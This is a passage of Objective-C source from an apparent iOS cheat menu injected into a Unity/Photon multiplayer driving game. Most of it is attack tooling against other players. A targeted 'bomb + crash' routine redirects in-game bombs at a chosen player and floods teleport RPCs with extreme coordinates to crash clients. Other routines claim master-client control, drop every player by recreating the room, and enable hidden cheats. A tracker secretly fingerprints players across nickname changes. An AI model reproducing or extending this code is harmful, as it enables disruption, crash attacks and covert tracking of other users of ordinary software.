            NSString *t = wm.textFields.firstObject.text;
            if (t.length > 3) {
                g_groqModel = t;
                [[NSUserDefaults standardUserDefaults] setObject:t forKey:@"few1n_groqModel"];
                FLog([NSString stringWithFormat:@"🔧 Custom model: %@", t]);
            }
        }]];
        [mp addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
        [self present:mp];
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"🧪 Test Et" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *provider = few1n_aiProviderName();
        few1n_aiAsk(@"Selam. Bir cumleyle kendini tanit.", ^(NSString *reply, NSString *error) {
            dispatch_async(dispatch_get_main_queue(), ^{
                UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🤖 Test Sonucu"
                    message:reply.length > 0 ? [NSString stringWithFormat:@"✅ %@ calisiyor!\n\nCevap:\n%@", provider, reply] : [NSString stringWithFormat:@"❌ %@", error ?: @"API istegi basarisiz; logu kontrol et."]
                    preferredStyle:UIAlertControllerStyleAlert];
                [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                [self present:r];
            });
        });
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)askAiDirect {
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🤖 AI'ye Soru Sor"
        message:@"Sormak istedigin soruyu yaz. Cevap hem ekranda gorunecek hem de odaya gonderilecek:"
        preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"Orn: naber, en hizli araba hangisi?";
        tf.autocapitalizationType = UITextAutocapitalizationTypeNone;
        tf.autocorrectionType = UITextAutocorrectionTypeNo;
    }];
    __weak UIAlertController *w = ac;
    [ac addAction:[UIAlertAction actionWithTitle:@"🚀 Gonder" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        NSString *prompt = w.textFields.firstObject.text;
        if (!prompt || prompt.length == 0) return;
        FLog([NSString stringWithFormat:@"🤖 Direct AI soruldu: '%@'", prompt]);
        few1n_aiAsk(prompt, ^(NSString *reply, NSString *error) {
            NSString *finalReply = reply.length > 0 ? reply : (error ?: @"AI cevap veremedi");
            NSString *nameCol = [NSString stringWithUTF8String:g_aiNameColorHex];
            NSString *replyCol = [NSString stringWithUTF8String:g_aiReplyColorHex];
            NSString *finalMsg = [NSString stringWithFormat:@"<color=#%@><b>[AI %@]</b></color> <color=#%@>%@</color>", nameCol, few1n_aiProviderName(), replyCol, finalReply];
            dispatch_async(dispatch_get_main_queue(), ^{
                @try {
                    // 1. Chat'e gonder (il2cpp chatSend ile)
                    if (chatGetInst && chatSend) {
                        void* mgr = chatGetInst();
                        void* ns = mkStr(finalMsg);
                        if (mgr && ns) chatSend(mgr, ns);
                    }
                    // 2. Ekranda göster
                    UIAlertController *res = [UIAlertController alertControllerWithTitle:@"🤖 AI Cevabi"
                        message:[NSString stringWithFormat:@"Soru: %@\n\nCevap:\n%@", prompt, finalReply]
                        preferredStyle:UIAlertControllerStyleAlert];
                    [res addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                    [self present:res];
                } @catch (...) {}
            });
        });
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

- (void)showPlayerIDs {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"🆔 Oyuncu ID" message:@"Odada olmalısın." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    if (!pn_getPlayerList || !ply_getNickName || !ply_getActorNumber) { FLog(@"🆔 Photon getters YOK"); return; }
    NSMutableString *out = [NSMutableString string];
    @try {
        void* pa = pn_getPlayerList();
        if (!ptrOk(pa)) { FLog(@"🆔 player list yok"); return; }
        int cnt = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
        if (cnt <= 0 || cnt > 64) { FLog(@"🆔 cnt anormal"); return; }
        void** ps = (void**)((uintptr_t)pa + 0x20);
        [out appendFormat:@"Odada %d oyuncu:\n\n", cnt];
        for (int i = 0; i < cnt && i < 32; i++) {
            void* p = ps[i]; if (!ptrOk(p)) continue;
            NSString *nick = ptrOk(ply_getNickName(p)) ? (readStr(ply_getNickName(p)) ?: @"?") : @"?";
            NSString *nickClean = stripRichTextTags(nick) ?: nick;
            int actor = ply_getActorNumber(p);
            NSString *uid = (ply_getUserId) ? (readStr(ply_getUserId(p)) ?: @"") : @"";
            [out appendFormat:@"👤 %@\n   Actor: %d  UserId: %@\n\n", nickClean, actor, uid.length > 0 ? uid : @"(yok)"];
        }
    } @catch (...) { [out appendString:@"Exception - kismi liste"]; }
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🆔 Oyuncu ID Listesi" message:out preferredStyle:UIAlertControllerStyleAlert];
    [ac addAction:[UIAlertAction actionWithTitle:@"📋 Panoya Kopyala" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
        [UIPasteboard generalPasteboard].string = out; FLog(@"🆔 ID listesi panoya kopyalandi");
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}

// v105: Isim degisikligi takibi toggle
- (void)tapNameTrack {
    isNameTrackEnabled = !isNameTrackEnabled;
    saveBool(@"nametrack", isNameTrackEnabled);
    if (nameTrackTimer) { [nameTrackTimer invalidate]; nameTrackTimer = nil; }
    if (isNameTrackEnabled) {
        if (!g_actorNickMap) g_actorNickMap = [NSMutableDictionary dictionary];
        if (!g_actorNickHistory) g_actorNickHistory = [NSMutableDictionary dictionary];
        nameTrackTimer = [NSTimer scheduledTimerWithTimeInterval:2.0 target:self selector:@selector(fireNameTrack) userInfo:nil repeats:YES];
        FLog(@"🕵️ İsim takibi AKTIF - her 2sn odadaki oyuncular taranir, isim degisikligi alert olur");
    } else FLog(@"🕵️ İsim takibi kapali");
    [self refreshUI];
}

- (void)fireNameTrack {
    if (!isNameTrackEnabled) return;
    if (!pn_getInRoom || !pn_getInRoom()) return;
    if (!pn_getPlayerList || !ply_getNickName || !ply_getActorNumber) return;
    few1n_loadPermaFingerprint();
    @try {
        void* pa = pn_getPlayerList();
        if (!ptrOk(pa)) return;
        int cnt = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
        if (cnt <= 0 || cnt > 64) return;
        void** ps = (void**)((uintptr_t)pa + 0x20);
        BOOL fpChanged = NO;
        for (int i = 0; i < cnt && i < 32; i++) {
            void* p = ps[i]; if (!ptrOk(p)) continue;
            int actor = ply_getActorNumber(p);
            NSString *nick = ptrOk(ply_getNickName(p)) ? (readStr(ply_getNickName(p)) ?: @"?") : @"?";
            NSString *nickClean = stripRichTextTags(nick) ?: nick;
            NSString *uid = (ply_getUserId) ? (readStr(ply_getUserId(p)) ?: @"") : @"";
            // v114.4: UserId yoksa (DreamRoad'da genelde yok) nickname'i fingerprint key olarak kullan
            // Bu ideal degil - nick degistirse tanimaz, ama en iyi fallback
            NSString *fpKey = (uid.length > 0) ? uid : [NSString stringWithFormat:@"NICK:%@", nickClean];
            NSNumber *key = @(actor);
            NSString *lastNick = g_actorNickMap[key];
            if (!lastNick) {
                g_actorNickMap[key] = nickClean;
                NSMutableArray *arr = [NSMutableArray array]; [arr addObject:nickClean]; g_actorNickHistory[key] = arr;
                FLog([NSString stringWithFormat:@"🕵️ Actor %d yeni: '%@' (uid=%@)", actor, nickClean, uid.length > 0 ? uid : @"(yok)"]);
                // v106: KALICI FINGERPRINT check - UserId onceden goruldu mu?
                // v114.4: fpKey = UserId veya NICK:nickClean fallback
                NSMutableArray *permaNicks = g_permaFingerprint[fpKey];
                if (permaNicks && permaNicks.count > 0 && ![permaNicks containsObject:nickClean]) {
                    NSString *msg = [NSString stringWithFormat:@"⚠️ FINGERPRINT UYARISI\n\nAnahtar: %@\nŞimdi: %@\n\nÖnceki nickler:\n%@", fpKey, nickClean, [permaNicks componentsJoinedByString:@", "]];
                    FLog([NSString stringWithFormat:@"⚠️ MATCH: key=%@ eski=%@ yeni=%@", fpKey, [permaNicks componentsJoinedByString:@","], nickClean]);
                    UIAlertController *r = [UIAlertController alertControllerWithTitle:@"⚠️ Eski Oyuncu" message:msg preferredStyle:UIAlertControllerStyleAlert];
                    [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                    [self present:r];
                    [permaNicks addObject:nickClean]; fpChanged = YES;
                } else if (!permaNicks) {
                    g_permaFingerprint[fpKey] = [NSMutableArray arrayWithObject:nickClean]; fpChanged = YES;
                }
            } else if (![lastNick isEqualToString:nickClean]) {
                g_actorNickMap[key] = nickClean;
                NSMutableArray *hist = g_actorNickHistory[key];
                if (![hist containsObject:nickClean]) [hist addObject:nickClean];
                NSString *msg = [NSString stringWithFormat:@"🕵️ İsim değişti! Actor %d\n\nÖnce: %@\nŞimdi: %@\n\nTüm gordugu: %@\n\nUserId: %@", actor, lastNick, nickClean, [hist componentsJoinedByString:@" → "], uid.length > 0 ? uid : @"(yok)"];
                FLog(msg);
                UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🕵️ İSİM DEĞİŞİKLİĞİ" message:msg preferredStyle:UIAlertControllerStyleAlert];
                [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                [self present:r];
                // v114.4: fpKey fallback (UserId veya NICK:nick)
                NSMutableArray *permaNicks = g_permaFingerprint[fpKey];
                if (!permaNicks) { permaNicks = [NSMutableArray array]; g_permaFingerprint[fpKey] = permaNicks; }
                if (![permaNicks containsObject:nickClean]) { [permaNicks addObject:nickClean]; fpChanged = YES; }
            }
        }
        if (fpChanged) few1n_savePermaFingerprint();
    } @catch (...) {}
}

// v114.4: Odayi Yeniden Olustur - SUNUCUDA GERCEK isim degisikligi (herkes duser + yeni odada sen)
- (void)recreateRoomWithNewName {
    if (!pn_leaveRoom || !pn_createRoom || !i_object_new || !g_roomOptionsClass) {
        FLog(@"❌ recreate: pn_leaveRoom/createRoom/RoomOptions YOK");
        return;
    }
    UIAlertController *warn = [UIAlertController alertControllerWithTitle:@"⚠️ Odayı Yeniden Oluştur"
        message:@"Bu işlem SUNUCUDA gerçek isim değişikliği yapar.\n\n⚠️ ODADAKİ HERKES DÜŞER (sen dahil)\n✅ Sonra sen yeni isimle yeni odayı kurarsın\n✅ Diğerleri lobide yeni ismi görür\n\nDevam?"
        preferredStyle:UIAlertControllerStyleAlert];
    [warn addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"Yeni oda ismi (rich text OK)";
        tf.text = [NSString stringWithUTF8String:customRoomName];
        tf.clearButtonMode = UITextFieldViewModeAlways;
    }];
    __weak UIAlertController *weakW = warn;
    [warn addAction:[UIAlertAction actionWithTitle:@"🔄 EVET - RECREATE ET" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
        NSString *newName = weakW.textFields.firstObject.text;
        if (!newName || newName.length == 0) newName = @"FEW1N ODA";
        strncpy(customRoomName, newName.UTF8String, sizeof(customRoomName)-1);
        customRoomName[sizeof(customRoomName)-1] = '\0';
        saveStr(@"roomName", newName);
        // 1) Odadan cik
        FLog([NSString stringWithFormat:@"🔄 Recreate: '%@' - önce odadan cikiyorum...", newName]);
        @try { pn_leaveRoom(false); } @catch (...) {}
        // 2) 2sn bekle - lobi'ye don sonra yeni isimle yarat
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            @try {
                void* opts = i_object_new(g_roomOptionsClass);
                if (!opts) { FLog(@"❌ recreate: RoomOptions instantiate FAIL"); return; }
                *(bool*)((uintptr_t)opts + 0x10) = true;   // IsVisible
                *(bool*)((uintptr_t)opts + 0x11) = true;   // IsOpen
                *(int*) ((uintptr_t)opts + 0x14) = roomMaxPlayers > 0 ? roomMaxPlayers : 31;
                *(int*) ((uintptr_t)opts + 0x1C) = 0;
                void* ns = mkStr(newName);
                if (ns) {
                    pn_createRoom(ns, opts, NULL, NULL);
                    FLog([NSString stringWithFormat:@"✓ recreate: yeni oda kuruldu '%@' (max=%d)", newName, roomMaxPlayers]);
                } else FLog(@"❌ recreate: mkStr FAIL");
            } @catch (...) { FLog(@"❌ recreate: create exception"); }
        });
    }]];
    [warn addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:warn];
}

// v103: Odadayken MaxPlayers degistir
- (void)changeMaxPlayersInRoom {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"👥 Max Oyuncu" message:@"Odada olmalısın." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    if (!room_setMaxPlayers) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"👥 Max Oyuncu" message:@"room_setMaxPlayers pointer YOK — bu Photon versiyonu desteklemez." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    int current = 0;
    @try {
        void* room = pn_getCurrentRoom ? pn_getCurrentRoom() : NULL;
        if (ptrOk(room) && room_getMaxPlayers) current = room_getMaxPlayers(room);
    } @catch (...) {}
    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"👥 Max Oyuncu Değiştir"
        message:[NSString stringWithFormat:@"Şu an: %d\nYeni değer (2-100, 0=sınırsız):", current]
        preferredStyle:UIAlertControllerStyleAlert];
    [ac addTextFieldWithConfigurationHandler:^(UITextField *tf){
        tf.placeholder = @"31"; tf.text = [NSString stringWithFormat:@"%d", current > 0 ? current : 31];
        tf.keyboardType = UIKeyboardTypeNumberPad; tf.clearButtonMode = UITextFieldViewModeAlways;
    }];
    __weak UIAlertController *weakAC = ac;
    [ac addAction:[UIAlertAction actionWithTitle:@"Uygula" style:UIAlertActionStyleDefault handler:^(UIAlertAction *aa){
        NSString *t = weakAC.textFields.firstObject.text;
        int newV = [t intValue];
        if (newV < 0 || newV > 200) {
            UIAlertController *er = [UIAlertController alertControllerWithTitle:@"Hata" message:@"0-200 arası olmalı" preferredStyle:UIAlertControllerStyleAlert];
            [er addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]]; [self present:er]; return;
        }
        FLog([NSString stringWithFormat:@"👥 Max Oyuncu = %d isteniyor - master claim baslatiliyor", newV]);
        few1n_claimMaster();
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            BOOL m = NO; if (pn_getLocalPlayer && ply_getIsMaster) { void* me = pn_getLocalPlayer(); if (me) m = ply_getIsMaster(me); }
            if (!m) { FLog(@"👥 hala master degilim - 2. deneme"); few1n_claimMaster(); }
        });
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            BOOL m = NO; if (pn_getLocalPlayer && ply_getIsMaster) { void* me = pn_getLocalPlayer(); if (me) m = ply_getIsMaster(me); }
            @try {
                void* room = pn_getCurrentRoom ? pn_getCurrentRoom() : NULL;
                if (!ptrOk(room)) { FLog(@"❌ Oda pointer yok"); return; }
                room_setMaxPlayers(room, newV);
                int after = room_getMaxPlayers ? room_getMaxPlayers(room) : -1;
                FLog([NSString stringWithFormat:@"👥 MaxPlayers set: istenen=%d gerçek=%d master=%@", newV, after, m ? @"EVET":@"HAYIR"]);
                UIAlertController *r = [UIAlertController alertControllerWithTitle:@"👥 Max Oyuncu"
                    message:[NSString stringWithFormat:@"İstek: %d\nGerçek: %d\nMaster: %@\n%@", newV, after, m ? @"EVET" : @"HAYIR", (after == newV) ? @"✅ Başarılı" : @"⚠️ Set edildi ama sunucu geri döndürmüş olabilir"]
                    preferredStyle:UIAlertControllerStyleAlert];
                [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                [self present:r];
            } @catch (...) { FLog(@"👥 exception"); }
        });
    }]];
    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
    [self present:ac];
}
- (void)startGizliTimerIfNeeded {
    BOOL anyOn = isInfiniteNosEnabled || isInfiniteFuelEnabled || isMaxRpmEnabled || isNoDamageV2Enabled || isEngineImmortalEnabled || isNoTrafficEnabled || isEmissivePaintEnabled || isExhaustFlameOnEnabled;
    if (anyOn && !gizliCheatTimer) {
        gizliCheatTimer = [NSTimer scheduledTimerWithTimeInterval:1.5 target:self selector:@selector(fireGizliCheats) userInfo:nil repeats:YES];
        FLog(@"🎁 Gizli cheat timer basladi (1.5sn'de bir apply)");
    } else if (!anyOn && gizliCheatTimer) {
        [gizliCheatTimer invalidate]; gizliCheatTimer = nil;
        FLog(@"🎁 Gizli cheat timer durdu (hepsi kapali)");
    }
}
- (void)fireGizliCheats { few1n_applyGizliCheats(); }

// v101: HEDEFLİ BOMBA + CRASH - oyuncu sec, 2 metod paralel dene
- (void)targetBombCrashPick {
    if (!pn_getInRoom || !pn_getInRoom()) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"💣 Hedefli Bomba" message:@"Odada olmalısın." preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
        [self present:e]; return;
    }
    if (!ply_getNickName) {
        UIAlertController *e = [UIAlertController alertControllerWithTitle:@"💣 Hedefli Bomba" message:@"ply_getNickName NULL - Photon hazir degil" preferredStyle:UIAlertControllerStyleAlert];
        [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]]; [self present:e]; return;
    }
    @try {
        // v107: pn_getPlayerListOthers NULL fallback -> pn_getPlayerList + self filter
        void* pa = NULL;
        if (pn_getPlayerListOthers) pa = pn_getPlayerListOthers();
        BOOL useAllList = NO;
        if (!ptrOk(pa) && pn_getPlayerList) { pa = pn_getPlayerList(); useAllList = YES; }
        if (!ptrOk(pa)) {
            UIAlertController *e = [UIAlertController alertControllerWithTitle:@"💣 Hedefli Bomba" message:@"Player list NULL - Photon ikisi de basarisiz" preferredStyle:UIAlertControllerStyleAlert];
            [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]]; [self present:e]; return;
        }
        int cnt = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
        void* me = (useAllList && pn_getLocalPlayer) ? pn_getLocalPlayer() : NULL;
        if (cnt <= 0 || cnt > 64) {
            UIAlertController *e = [UIAlertController alertControllerWithTitle:@"💣 Hedefli Bomba" message:[NSString stringWithFormat:@"Odada baska oyuncu yok. (cnt=%d)", cnt] preferredStyle:UIAlertControllerStyleAlert];
            [e addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
            [self present:e]; return;
        }
        void** ps = (void**)((uintptr_t)pa + 0x20);
        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"💣 Hedefli Bomba + Crash"
            message:[NSString stringWithFormat:@"Odada %d oyuncu.\nSec → HR_Bomb swap + CarPhotonSync NaN inject 5x", cnt]
            preferredStyle:UIAlertControllerStyleActionSheet];
        for (int i = 0; i < cnt && i < 32; i++) {
            void* p = ps[i]; if (!ptrOk(p)) continue;
            if (me && p == me) continue;   // v107: kendisini skip et
            void* nsObj = ply_getNickName(p);
            NSString *nm = ptrOk(nsObj) ? (readStr(nsObj) ?: @"") : @"";
            if (nm.length == 0) nm = [NSString stringWithFormat:@"actor%d", i];
            NSString *nmClean = stripRichTextTags(nm) ?: nm;
            NSString *nmCopy = [nm copy];
            [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"🎯 %@", nmClean]
                style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
                // v114.4: MANUEL METOD SECIMI - hedef secildikten sonra hangi saldirinin uygulanacagini kullanici sec
                UIAlertController *pick = [UIAlertController alertControllerWithTitle:[NSString stringWithFormat:@"🎯 '%@'", nmCopy]
                    message:@"Hangi saldiri?" preferredStyle:UIAlertControllerStyleAlert];
                // A) Sadece Bomb
                [pick addAction:[UIAlertAction actionWithTitle:@"💣 SADECE BOMBA (HR_Bomb swap)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *aa){
                    FLog([NSString stringWithFormat:@"💣 SADECE BOMBA: '%@'", nmCopy]);
                    int m = 0;
                    @try {
                        if (g_hrBombTypeObj && g_mFindObjectsPlural && i_runtime_invoke && g_playerHandlerType) {
                            void* aP[1]; aP[0] = g_playerHandlerType;
                            void* phs = i_runtime_invoke(g_mFindObjectsPlural, NULL, aP, NULL);
                            void* targetPH = NULL;
                            if (ptrOk(phs)) {
                                int pcnt = (int)(*(uintptr_t*)((uintptr_t)phs + 0x18));
                                if (pcnt > 0 && pcnt < 32) {
                                    void** phArr = (void**)((uintptr_t)phs + 0x20);
                                    for (int k = 0; k < pcnt; k++) {
                                        void* ph = phArr[k]; if (!unityAlive(ph)) continue;
                                        NSString *phName = readStr(*(void**)((uintptr_t)ph + 0x28));
                                        if (phName && [phName rangeOfString:nmCopy options:NSCaseInsensitiveSearch].location != NSNotFound) { targetPH = ph; break; }
                                    }
                                }
                            }
                            void* aB[1]; aB[0] = g_hrBombTypeObj;
                            void* bombs = i_runtime_invoke(g_mFindObjectsPlural, NULL, aB, NULL);
                            if (ptrOk(bombs) && targetPH) {
                                int bc = (int)(*(uintptr_t*)((uintptr_t)bombs + 0x18));
                                if (bc > 0 && bc < 32) {
                                    void** bArr = (void**)((uintptr_t)bombs + 0x20);
                                    for (int k = 0; k < bc; k++) { void* b = bArr[k]; if (unityAlive(b)) { *(void**)((uintptr_t)b + 0x18) = targetPH; m++; } }
                                }
                            }
                        }
                    } @catch (...) {}
                    UIAlertController *r = [UIAlertController alertControllerWithTitle:@"💣 Bomba" message:[NSString stringWithFormat:@"'%@' - %d HR_Bomb hedeflendi", nmCopy, m] preferredStyle:UIAlertControllerStyleAlert];
                    [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]]; [self present:r];
                }]];
                // B) Sadece Crash
                [pick addAction:[UIAlertAction actionWithTitle:@"💥 SADECE CRASH (NaN teleport 5x)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *aa){
                    FLog([NSString stringWithFormat:@"💥 SADECE CRASH: '%@'", nmCopy]);
                    for (int shot = 0; shot < 5; shot++) {
                        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(shot * 0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                            @try {
                                if (g_carPhotonSyncTypeObj && cps_TeleportCar_RPC && g_mFindObjectsPlural && i_runtime_invoke) {
                                    void* aC[1]; aC[0] = g_carPhotonSyncTypeObj;
                                    void* cars = i_runtime_invoke(g_mFindObjectsPlural, NULL, aC, NULL);
                                    if (ptrOk(cars)) {
                                        int cc = (int)(*(uintptr_t*)((uintptr_t)cars + 0x18));
                                        if (cc > 0 && cc < 32) {
                                            void** cArr = (void**)((uintptr_t)cars + 0x20);
                                            for (int k = 0; k < cc; k++) {
                                                void* cps = cArr[k]; if (!unityAlive(cps)) continue;
                                                Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
                                                Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
                                                cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
                                            }
                                        }
                                    }
                                }
                            } @catch (...) {}
                        });
                    }
                    UIAlertController *r = [UIAlertController alertControllerWithTitle:@"💥 Crash" message:[NSString stringWithFormat:@"'%@' - 5x NaN inject gonderildi (1sn icinde)", nmCopy] preferredStyle:UIAlertControllerStyleAlert];
                    [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]]; [self present:r];
                }]];
                // C) İkisini birden
                [pick addAction:[UIAlertAction actionWithTitle:@"🔥 İKİSİ BİRDEN (Bomb + Crash)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *aa){
                FLog([NSString stringWithFormat:@"🔥 İKİSİ: '%@' - Bomb + Crash paralel", nmCopy]);
                int m = 0;
                @try {
                    if (g_hrBombTypeObj && g_mFindObjectsPlural && i_runtime_invoke && g_playerHandlerType) {
                        // hedefin playerHandler'ini bul: FindObjectsOfType<HR_PlayerHandler>() ve nickname eslesme
                        void* aP[1]; aP[0] = g_playerHandlerType;
                        void* phs = i_runtime_invoke(g_mFindObjectsPlural, NULL, aP, NULL);
                        void* targetPH = NULL;
                        if (ptrOk(phs)) {
                            int pcnt = (int)(*(uintptr_t*)((uintptr_t)phs + 0x18));
                            if (pcnt > 0 && pcnt < 32) {
                                void** phArr = (void**)((uintptr_t)phs + 0x20);
                                for (int k = 0; k < pcnt; k++) {
                                    void* ph = phArr[k]; if (!unityAlive(ph)) continue;
                                    NSString *phName = readStr(*(void**)((uintptr_t)ph + 0x28)); // VehicleName - hedef isim degil ama best guess
                                    if (phName && [phName rangeOfString:nmCopy options:NSCaseInsensitiveSearch].location != NSNotFound) { targetPH = ph; break; }
                                }
                            }
                        }
                        // HR_Bomb instance'lari
                        void* aB[1]; aB[0] = g_hrBombTypeObj;
                        void* bombs = i_runtime_invoke(g_mFindObjectsPlural, NULL, aB, NULL);
                        if (ptrOk(bombs) && targetPH) {
                            int bc = (int)(*(uintptr_t*)((uintptr_t)bombs + 0x18));
                            if (bc > 0 && bc < 32) {
                                void** bArr = (void**)((uintptr_t)bombs + 0x20);
                                for (int k = 0; k < bc; k++) {
                                    void* b = bArr[k]; if (!unityAlive(b)) continue;
                                    *(void**)((uintptr_t)b + 0x18) = targetPH;   // ifl PlayerHandler swap
                                    m++;
                                }
                                FLog([NSString stringWithFormat:@"  ✓ Metod A: %d HR_Bomb PlayerHandler swap edildi", m]);
                            }
                        } else FLog(@"  - Metod A: HR_Bomb yok veya hedef PH bulunamadi");
                    } else FLog(@"  - Metod A: g_hrBombTypeObj/playerHandlerType YOK");
                } @catch (...) { FLog(@"  ✗ Metod A: exception"); }
                // Metod B: CarPhotonSync ile NaN koordinat inject (5x rate-limited)
                for (int shot = 0; shot < 5; shot++) {
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(shot * 0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        @try {
                            if (g_carPhotonSyncTypeObj && cps_TeleportCar_RPC && g_mFindObjectsPlural && i_runtime_invoke) {
                                void* aC[1]; aC[0] = g_carPhotonSyncTypeObj;
                                void* cars = i_runtime_invoke(g_mFindObjectsPlural, NULL, aC, NULL);
                                if (ptrOk(cars)) {
                                    int cc = (int)(*(uintptr_t*)((uintptr_t)cars + 0x18));
                                    if (cc > 0 && cc < 32) {
                                        void** cArr = (void**)((uintptr_t)cars + 0x20);
                                        for (int k = 0; k < cc; k++) {
                                            void* cps = cArr[k]; if (!unityAlive(cps)) continue;
                                            Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
                                            Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
                                            cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
                                        }
                                    }
                                }
                            }
                        } @catch (...) {}
                    });
                }
                FLog(@"  ✓ Metod B: 5x NaN teleport RPC gonderildi (0.2s araliklarla)");
                UIAlertController *r = [UIAlertController alertControllerWithTitle:@"🔥 İKİSİ BİRDEN"
                    message:[NSString stringWithFormat:@"'%@'\n\nBomba: %d swap\nCrash: 5x NaN inject", nmCopy, m]
                    preferredStyle:UIAlertControllerStyleAlert];
                [r addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
                [self present:r];
                }]];
                [pick addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
                [self present:pick];
            }]];
        }
        [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
        if (ac.popoverPresentationController) {
            ac.popoverPresentationController.sourceView = self.panel;
            ac.popoverPresentationController.sourceRect = CGRectMake(self.panel.bounds.size.width/2, 80, 1, 1);
        }
        [self present:ac];
    } @catch (...) { FLog(@"💣 targetBombCrashPick exception"); }
}
- (void)tapInfiniteNos {
    FLog(@"💨 NOS toggle kaldirildi (v90)");
    [self refreshUI];
}

- (void)fireGifFrame {
    if (!chatGetInst || !chatSend || !g_gifFrames || g_gifFrames.count == 0) {
        if (g_gifTimer) { [g_gifTimer invalidate]; g_gifTimer = nil; }
        return;
    }
    @try {
        if (g_gifIdx < 0 || g_gifIdx >= (int)g_gifFrames.count) g_gifIdx = 0;
        NSString *body = g_gifFrames[g_gifIdx++];
        // mspace = her karakter ESIT genislik -> ASCII duzgun hizalanir (TMP proportional fontta bozulmaz).
        // size%% = kucult ki uzun satirlar chate sigsin.
        NSString *frame = [NSString stringWithFormat:@"<size=50%%><mspace=0.58em>%@</mspace></size>", body];
        if (g_gifColored) frame = rainbowWrap(frame, g_colorIdx++);
        void* mgr = chatGetInst();
        if (!mgr) return;
        void* s = mkStr(frame);
        if (s) chatSend(mgr, s);
    } @catch (...) {}
}

